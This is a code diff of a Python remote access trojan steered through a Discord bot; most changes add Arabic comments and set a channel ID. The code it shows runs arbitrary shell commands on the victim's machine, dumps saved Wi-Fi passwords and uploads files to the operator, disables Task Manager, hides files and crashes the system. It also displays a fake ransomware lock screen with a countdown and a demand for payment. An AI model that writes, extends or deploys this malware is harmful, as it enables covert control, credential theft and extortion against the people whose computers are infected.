@@ -54,17 +54,17 @@ helpmenu = """
 @client.event
 #event when he start he send message
 async def on_ready():
-    channel = client.get_channel()  # put here discord channel id 
+    channel = client.get_channel(1402290435522695309)  # ضع هنا معرف القناة التي تريد الإرسال فيها
     if channel:
         embed = discord.Embed(description=f"**[+1]**", color=0x460496)
         embed.set_author(name="𝓝𝓮𝔀 𝓢𝓮𝓼𝓼𝓲𝓸𝓷 💤")
         await channel.send(embed=embed)
 @client.event
 async def on_message(message):
-    
+    # لا تتجاهل أي رسالة، سواء من بوت أو إنسان
     print(f"Message from {message.author} ({'bot' if message.author.bot else 'user'}): {message.content}")
 
-   
+    # عالج الأوامر بشكل طبيعي
     await client.process_commands(message)
 ################################################################################################################
 ################################################################################################################
@@ -98,7 +98,7 @@ async def cd(ctx, *, path):
         new_path = os.path.abspath(os.path.join(current_dir, path))
         if os.path.exists(new_path) and os.path.isdir(new_path):
             current_dir = new_path
-            os.chdir(current_dir)  
+            os.chdir(current_dir)  # مهم جداً
             embed = discord.Embed(description=f"**Changed directory to:**\n {current_dir}", color=0x460496)
             embed.set_author(name="Change Directory💤")
             embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
@@ -119,30 +119,35 @@ async def fronsamware(ctx, cod):
     import os, sys, base64
     from tkinter import Tk, Label, Entry, Frame, Button, PhotoImage, CENTER, messagebox
 
+    # ---------- دالة للملفات المرفقة ----------
     def rsrc(p):
         try:
             return os.path.join(sys._MEIPASS, p)
         except Exception:
             return os.path.join(os.path.abspath("."), p)
 
+    # ---------- التحقق من الكود ----------
     def check_key():
         if entry.get() == cod:
             win.destroy()
         else:
             messagebox.showerror("Error", "Incorrect key 😎")
 
-    ACC = "#0059FF"  
-    BG = "black"    
+    # ---------- الألوان ----------
+    ACC = "#0059FF"  # لون النصوص
+    BG = "black"     # الخلفية
 
+    # ---------- النافذة الأساسية ----------
     win = Tk()
     win.title("System Alert")
     win.attributes("-fullscreen", True)
     win.configure(bg=BG)
-    win.protocol("WM_DELETE_WINDOW", lambda: None)  
-    win.attributes("-topmost", True)  
+    win.protocol("WM_DELETE_WINDOW", lambda: None)  # منع الإغلاق بزر X
+    win.attributes("-topmost", True)  # دائماً في الأمام
     win.focus_force()
     win.lift()
 
+    # ---------- إعادة التركيز باستمرار ----------
     def force_focus():
         win.lift()
         win.focus_force()
@@ -150,6 +155,7 @@ async def fronsamware(ctx, cod):
 
     force_focus()
 
+    # ---------- الرسالة ----------
     MSG = """
     All ur files get crypted so pay me 🔓 like a dog to restor ur files or lose it 🎭
     If you decide to restart! ur computer your system will be down
@@ -167,7 +173,8 @@ async def fronsamware(ctx, cod):
             index += 1
             win.after(40, typer)
 
-    time_left = 3600 
+    # ---------- عدّاد الوقت ----------
+    time_left = 3600  # ثانية (ساعة واحدة)
     time_lbl = Label(win, font=("Courier", 24, "bold"), bg=BG, fg=ACC,
                      highlightbackground=ACC, highlightcolor=ACC, highlightthickness=2)
     time_lbl.place(relx=0.5, rely=0.1, anchor="center")
@@ -181,6 +188,7 @@ async def fronsamware(ctx, cod):
             time_left -= 1
             win.after(1000, update_timer)
 
+    # ---------- عرض الصورة ----------
     try:
         img = PhotoImage(file=rsrc("image.png"))
         img = img.subsample(3, 3)
@@ -191,6 +199,7 @@ async def fronsamware(ctx, cod):
     except:
         pass
 
+    # ---------- إدخال الكود ----------
     Label(win, text="Enter Decryption Key", font=("Ink Free", 20, "bold"),
           bg=BG, fg=ACC).place(relx=0.5, rely=0.5, anchor="center")
 
@@ -209,6 +218,7 @@ async def fronsamware(ctx, cod):
     press_enter.place(relx=0.5, rely=0.498, anchor="center")
     win.bind('<Return>', lambda e: check_key())
 
+    # ---------- تشغيل ----------
     update_timer()
     typer()
     win.mainloop()
@@ -219,7 +229,7 @@ async def fronsamware(ctx, cod):
     
 @client.command()
 async def upload(ctx):
-
+    # تأكد أن هناك مرفق في الرسالة
     if ctx.message.attachments:
         attachment = ctx.message.attachments[0]
         save_path = os.path.join(os.getcwd(), attachment.filename)
@@ -269,8 +279,11 @@ def zip_folder_or_file(path, zip_name="UrFile.zip"):
             zipf.write(path, os.path.basename(path))
     return zip_name
 
+# أمر Discord
+#########################################################################################################################
 @client.command()
 async def hide(ctx, *, path):
+    """إخفاء ملف أو مجلد"""
     try:
         if os.path.exists(path):
             subprocess.run(f'attrib +h "{path}"', shell=True, check=True)
@@ -291,6 +304,7 @@ async def hide(ctx, *, path):
 
 @client.command()
 async def unhide(ctx, *, path):
+    """إظهار ملف أو مجلد"""
     try:
         if os.path.exists(path):
             subprocess.run(f'attrib -h "{path}"', shell=True, check=True)
@@ -311,6 +325,7 @@ async def unhide(ctx, *, path):
 @client.command()
 async def distaskmgr(ctx):
     try:
+        # تعطيل مدير المهام عبر الريجستري
         subprocess.run(
             r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
             shell=True, check=True
@@ -327,6 +342,7 @@ async def distaskmgr(ctx):
 @client.command()
 async def enbtaskmgr(ctx):
     try:
+        # تمكين مدير المهام عبر الريجستري
         subprocess.run(
             r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f',
             shell=True, check=True
@@ -344,6 +360,7 @@ async def enbtaskmgr(ctx):
 async def tasklist(ctx):
     tasklist_output = subprocess.check_output('tasklist', shell=True, text=True)
     
+    # نحط المخرجات بين ``` حتى يحافظ على شكل الجدول
     for chunk in [tasklist_output[i:i+1900] for i in range(0, len(tasklist_output), 1900)]:
         embed = discord.Embed(description=f"```{chunk}```", color=0x460496)
         embed.set_author(name="TaskList❤️‍🔥")
@@ -353,12 +370,14 @@ async def tasklist(ctx):
 @client.command()
 async def wifo(ctx):
     try:
+        # الحصول على كل أسماء الشبكات المحفوظة
         profiles_output = subprocess.check_output(
             'netsh wlan show profiles', shell=True, text=True, encoding='utf-8'
         )
         profiles = []
         for line in profiles_output.split('\n'):
             if "All User Profile" in line or "كل ملفات تعريف المستخدم" in line:
+                # يدعم العربية والإنجليزية
                 profile_name = line.split(":")[-1].strip()
                 profiles.append(profile_name)
 
@@ -372,6 +391,7 @@ async def wifo(ctx):
         result = ""
         for profile in profiles:
             try:
+                # جلب معلومات الشبكة وكلمة السر
                 wifi_details = subprocess.check_output(
                     f'netsh wlan show profile name="{profile}" key=clear',
                     shell=True, text=True, encoding='utf-8'
@@ -385,6 +405,7 @@ async def wifo(ctx):
             except Exception as e:
                 result += f"SSID: `{profile}`\nPassword: `خطأ في القراءة`\n\n"
 
+        # تقسيم الرسالة إذا كانت طويلة
         for chunk in [result[i:i+1900] for i in range(0, len(result), 1900)]:
             embed = discord.Embed(description=f"{chunk}", color=0x460496)
             embed.set_author(name="Networks Informations")
@@ -415,7 +436,7 @@ async def download(ctx, *, path):
             }
             res = requests.post(webhook_url, files=files)
 
-        os.remove(zip_path)  
+        os.remove(zip_path)  # تنظيف الملف
 
         if res.status_code in [200, 204]:
             embed = discord.Embed(description=f"**File Was Sended With Success🚬**", color=0x460496)
@@ -432,6 +453,7 @@ async def download(ctx, *, path):
         embed.set_author(name="Download Error")
         embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
         await ctx.send(embed=embed)
+#==============================#
 @client.command()
 async def kill(ctx):
     embed = discord.Embed(description=f"**ShutDown Ur Cute With Succed❤️‍🔥**", color=0x460496)
@@ -454,6 +476,7 @@ async def openlink(ctx , url):
     embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
     await ctx.send(embed=embed)
 @client.command()
+#change the wallpaper
 async def changewallpaper(ctx , image_url):
     def download_image(url, save_path):
         response = requests.get(url)
@@ -467,6 +490,8 @@ async def changewallpaper(ctx , image_url):
         SPI_SETDESKWALLPAPER = 20
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
 
+    # مثال للرابط (حط رابط صورة bmp أو حولها أول)
+    # image_url = "https://mcdn.wallpapersafari.com/medium/40/51/qRHscL.jpg"
     local_path = os.path.join(os.getenv('TEMP'), 'wallpaper.bmp')
 
     if download_image(image_url, local_path):
@@ -478,18 +503,21 @@ async def changewallpaper(ctx , image_url):
     else:
         print("Failed to download the image")
 @client.command()
+#check if the bot work 
 async def uhere(ctx):
     embed = discord.Embed(description=f"**Ur Cute Was Greating U 😌❤️‍🔥**", color=0x460496)
     embed.set_author(name="Uhere💤")
     embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
     await ctx.send(embed=embed)
 @client.command()
+#show the help message
 async def helpme(ctx):
     embed = discord.Embed(description=f"{helpmenu}", color=0x460496)
     embed.set_author(name="HelpMenu")
     embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
     await ctx.send(embed=embed)
 @client.command()
+# send mss to the target
 async def mss(ctx ,*, mss):
     title = "Message From Xz3ro Cute"
     ctypes.windll.user32.MessageBoxW(0, mss , title, 0x40)
@@ -497,12 +525,12 @@ async def mss(ctx ,*, mss):
     embed.set_author(name="Message💤")
     embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
     await ctx.send(embed=embed)
-current_dir = os.getcwd() 
+current_dir = os.getcwd()  # المتغير العمومي لحفظ الدليل الحالي
 @client.command()
 async def shell(ctx, *, command):
     global current_dir
     try:
-
+        # دائما استعمل os.chdir(current_dir) قبل تنفيذ أي أمر
         os.chdir(current_dir)
 
         if command.strip().startswith("cd "):
@@ -510,7 +538,7 @@ async def shell(ctx, *, command):
             new_path = os.path.abspath(os.path.join(current_dir, path))
             if os.path.exists(new_path) and os.path.isdir(new_path):
                 current_dir = new_path
-                os.chdir(current_dir)  
+                os.chdir(current_dir)  # ضروري جدا هنا
                 embed = discord.Embed(description=f"[+] Changed directory to:\n{current_dir}", color=0x460496)
                 embed.set_author(name="Change Directory💤")
                 embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
@@ -526,7 +554,7 @@ async def shell(ctx, *, command):
                 shell=True,
                 stderr=subprocess.STDOUT,
                 text=True,
-                cwd=current_dir 
+                cwd=current_dir  # تأكد من أنه يستعمل المسار الصحيح
             )
             if not result.strip():
                 result = "[+] Command executed with no output."
@@ -546,6 +574,7 @@ async def shell(ctx, *, command):
         embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
         await ctx.send(embed=embed)
 @client.command()
+#information aabout the system
 async def sysinfo(ctx):
     info = f"""
                OS {platform.system()} {platform.release()}
@@ -561,6 +590,7 @@ async def sysinfo(ctx):
     embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
     await ctx.send(embed=embed)
 @client.command()
+#crush the sistem windows 
 async def bluescreen(ctx , mss):
     ctypes.windll.user32.MessageBoxW(0, mss , "From Z3ro", 0x40)
     time.sleep(0.4)
@@ -607,6 +637,4 @@ async def pwd(ctx):
     embed.set_author(name="Pwd💤")
     embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
     await ctx.send(embed=embed)
-
-client.run("Discord Bot Token")
-
+client.run("Need Ur Bot Token")
